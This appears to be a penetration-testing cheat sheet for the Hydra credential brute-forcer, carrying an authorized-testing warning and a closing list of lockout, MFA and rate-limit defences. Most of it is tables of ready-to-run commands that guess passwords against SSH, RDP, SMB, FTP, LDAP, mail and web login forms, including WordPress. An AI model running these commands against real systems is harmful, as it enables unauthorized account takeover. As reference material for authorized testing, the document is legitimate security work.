# Hydra

> Network-protocol credential brute-forcer. Authorized testing only — never against systems without written permission.

## TL;DR
- `-l user` / `-L users.txt`, `-p pass` / `-P wordlist.txt`, `-t N` thread count (some protocols cap at 4).
- `-V` verbose per-attempt; `-f` stop on first success; `-s <port>` non-default port.
- Form modules: `http-get-form`, `http-post-form` with template `"PATH:BODY:FAIL_STRING"`.
- Account lockout / IPS will trip — start with `-t 1` and small lists during validation.

## Detection / Discovery
| Command | Description |
| --- | --- |
| `hydra -h` | Module list and option reference |

## Exploitation

### Single-protocol modules
| Command | Description |
| --- | --- |
| `hydra -P password-file.txt -v $ip snmp` | SNMP brute force |
| `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp` | FTP known user, rockyou list |
| `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh` | SSH user-and-password list |
| `hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh` | SSH user list, empty password |
| `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt` | SSH against known user on port 22 |
| `hydra -l USERNAME -P /usr/share/wordlists/nmap.lst -f $ip pop3 -V` | POP3 brute force |
| `hydra -P /usr/share/wordlists/nmap.lst $ip smtp -V` | SMTP brute force |
| `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin` | HTTP-GET 401 login |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip` | RDP with rockyou |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb` | SMB brute force |
| `hydra -L usernames.txt -P passwords.txt $ip smb -V -f` | SMB user+password matrix |
| `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f` | LDAP brute force |

### HTTP form modules
| Command | Description |
| --- | --- |
| `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress login (success on `Location` header) |
| `hydra -l admin -P /root/Desktop/wordlists/test.txt dvwa http-get-form "//index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."` | DVWA GET form (failure-string match) |
| `hydra -L usernames.txt -P rockyou.txt http-post-form "/loginCheck.php:username=^USER^&password=^PASS^:F=invalid" -f` | Generic POST form, `F=` failure marker |

## Defence / Remediation
- Account lockout / progressive delay on failed authentication (NIST 800-63B 5.2.2).
- MFA on all internet-exposed authentication endpoints — CWE-308 Use of Single-factor Authentication.
- Strong-password policy + breach-corpus rejection (NIST 800-63B 5.1.1.2).
- Rate-limit and alert on per-source / per-account failure rate spikes; IPS rules for known protocol brute-force signatures.
- Move SSH/RDP off the public internet (VPN/zero-trust gateway) and disable password auth where possible.

## Sources
- thc-hydra upstream: https://github.com/vanhauser-thc/thc-hydra
- HackTricks brute-force recipes: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html
- MITRE ATT&CK T1110 Brute Force: https://attack.mitre.org/techniques/T1110/
- NIST SP 800-63B Digital Identity Guidelines: https://pages.nist.gov/800-63-3/sp800-63b.html
